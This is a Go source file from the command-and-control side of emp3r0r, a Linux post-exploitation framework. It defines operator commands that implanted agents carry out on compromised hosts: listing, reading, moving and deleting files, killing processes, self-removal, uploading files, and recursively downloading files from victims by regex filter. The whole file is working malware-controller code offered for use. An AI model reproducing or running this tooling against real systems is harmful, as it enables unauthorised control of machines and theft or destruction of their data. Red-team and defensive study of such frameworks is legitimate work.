//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func ls(cmd *cobra.Command, args []string) {
	dst := "."
	if len(args) != 0 {
		dst = args[0]
	}

	FSCmdDst("ls", dst)
}

func pwd(cmd *cobra.Command, args []string) {
	executeCmd("pwd")
}

func cd(cmd *cobra.Command, args []string) {
	activeAgent := ValidateActiveTarget()
	if activeAgent == nil {
		LogError("cd: no active target")
		return
	}

	dst := args[0]
	activeAgent.CWD = dst
	cmd_id := uuid.NewString()
	err := SendCmdToCurrentTarget(fmt.Sprintf("cd --dst %s", dst), cmd_id)
	if err != nil {
		LogError("Cannot cd to %s: %v", dst, err)
		return
	}
	// wait for response, max 10s
	for i := 0; i < 100; i++ {
		time.Sleep(100 * time.Millisecond)
		res, exists := CmdResults[cmd_id]
		if exists {
			if !strings.Contains(res, "error") {
				LogInfo("cd: %s", res)
				activeAgent.CWD = res // update CWD to absolute path
			}
			break
		}
	}
}

func cat(_ *cobra.Command, args []string) {
	dst := args[0]
	FSCmdDst("cat", dst)
}

func cp(cmd *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]

	FSCmdSrcDst("cp", src, dst)
}

func rm(cmd *cobra.Command, args []string) {
	dst := args[0]
	FSCmdDst("rm", dst)
}

func mkdir(cmd *cobra.Command, args []string) {
	dst := args[0]
	FSCmdDst("mkdir", dst)
}

func mv(cmd *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]
	FSCmdSrcDst("mv", src, dst)
}

func ps(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	user, _ := cmd.Flags().GetString("user")
	name, _ := cmd.Flags().GetString("name")
	cmdLine, _ := cmd.Flags().GetString("cmdline")

	cmdArgs := "ps"
	if pid != 0 {
		cmdArgs = fmt.Sprintf("%s --pid %d", cmdArgs, pid)
	}
	if user != "" {
		cmdArgs = fmt.Sprintf("%s --user %s", cmdArgs, user)
	}
	if name != "" {
		cmdArgs = fmt.Sprintf("%s --name %s", cmdArgs, name)
	}
	if cmdLine != "" {
		cmdArgs = fmt.Sprintf("%s --cmdline %s", cmdArgs, cmdLine)
	}
	executeCmd(cmdArgs)
}

func net_helper(cmd *cobra.Command, args []string) {
	executeCmd("net_helper")
}

func suicide(cmd *cobra.Command, args []string) {
	executeCmd("suicide")
}

func kill(cmd *cobra.Command, args []string) {
	pid := args[0:]
	executeCmd(fmt.Sprintf("kill --pid %v+", strings.Join(pid, " ")))
}

func FSCmdDst(cmd, dst string) {
	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
}

func FSCmdSrcDst(cmd, src, dst string) {
	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
}

func UploadToAgent(cmd *cobra.Command, args []string) {
	target := ValidateActiveTarget()
	if target == nil {
		LogError("You have to select a target first")
		return
	}

	src, err := cmd.Flags().GetString("src")
	if err != nil {
		LogError("UploadToAgent: %v", err)
		return
	}
	dst, err := cmd.Flags().GetString("dst")
	if err != nil {
		LogError("UploadToAgent: %v", err)
		return
	}

	if src == "" || dst == "" {
		LogError(cmd.UsageString())
		return
	}

	if err := PutFile(src, dst, target); err != nil {
		LogError("Cannot put %s: %v", src, err)
	}
}

func DownloadFromAgent(cmd *cobra.Command, args []string) {
	target := ValidateActiveTarget()
	if target == nil {
		LogError("You have to select a target first")
		return
	}
	// parse command-line arguments using pflag
	isRecursive, _ := cmd.Flags().GetBool("recursive")
	filter, _ := cmd.Flags().GetString("regex")

	file_path, err := cmd.Flags().GetString("path")
	if err != nil {
		LogError("download: %v", err)
		return
	}
	if file_path == "" {
		LogError("download: path is required")
		return
	}

	if isRecursive {
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget(fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", file_path, strconv.Quote(filter), uuid.NewString()), cmd_id)
		if err != nil {
			LogError("Cannot get %v+: %v", args, err)
			return
		}
		LogInfo("Waiting for response from agent %s", target.Tag)
		var result string
		var exists bool
		for i := 0; i < 10; i++ {
			result, exists = CmdResults[cmd_id]
			if exists {
				LogInfo("Got file list from %s", target.Tag)
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd_id)
				CmdResultsMutex.Unlock()
				if result == "" {
					LogError("Cannot get %s: empty file list in directory", file_path)
				}
				break
			}
			time.Sleep(1 * time.Second)
		}
		LogDebug("Got file list: %s", result)

		// download files
		files := strings.Split(result, "\n")
		failed_files := []string{}
		defer func() {
			LogMsg("Checking %d downloads...", len(files))
			// check if downloads are successful
			for _, file := range files {
				// filenames
				_, target_file, tempname, lock := generateGetFilePaths(file)
				// check if download is successful
				if util.IsFileExist(tempname) || util.IsFileExist(lock) || !util.IsFileExist(target_file) {
					LogWarning("%s: download seems unsuccessful", file)
					failed_files = append(failed_files, file)
				}
			}
			if len(failed_files) > 0 {
				LogError("Failed to download %d files: %s", len(failed_files), strings.Join(failed_files, ", "))
			} else {
				LogSuccess("All %d files downloaded successfully", len(files))
			}
		}()
		LogInfo("Downloading %d files", len(files))
		for n, file := range files {
			ftpSh, err := GetFile(file, target)
			if err != nil {
				LogWarning("Cannot get %s: %v", file, err)
				continue
			}

			LogMsg("Downloading %d/%d: %s", n+1, len(files), file)

			// wait for file to be downloaded
			for {
				if sh, ok := FTPStreams[file]; ok {
					if ftpSh.Token == sh.Token {
						util.TakeABlink()
						continue
					}
				}
				break
			}
		}
	} else {
		if _, err := GetFile(file_path, target); err != nil {
			LogError("Cannot get %s: %v", strconv.Quote(file_path), err)
		}
	}
}

func executeCmd(cmd string) {
	activeAgent := ValidateActiveTarget()
	if activeAgent == nil {
		LogError("%s: no active target", cmd)
		return
	}
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		LogError("%s failed: %v", cmd, err)
	}
}
